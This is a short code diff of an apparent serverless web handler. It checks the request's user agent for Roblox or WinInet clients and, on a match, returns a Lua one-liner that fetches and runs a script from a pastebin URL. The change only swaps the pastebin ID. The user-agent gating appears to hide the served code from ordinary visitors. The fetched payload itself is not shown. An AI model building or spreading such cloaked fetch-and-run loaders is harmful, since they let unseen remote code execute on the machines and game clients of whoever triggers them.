@@ -4,7 +4,7 @@ export default function handler(req, res) {
   if (ua.includes("Roblox") || ua.includes("RobloxGameCloud") || ua.includes("WinInet")) {
     res.setHeader('Content-Type', 'text/plain');
     
-    const pastebinUrl = "https://pastebin.com/raw/uJnrp1D2";
+    const pastebinUrl = "https://pastebin.com/raw/3n4p5cUR";
     const luaCode = 'loadstring(game:HttpGet("' + pastebinUrl + '"))()';
     
     res.status(200).send(luaCode);
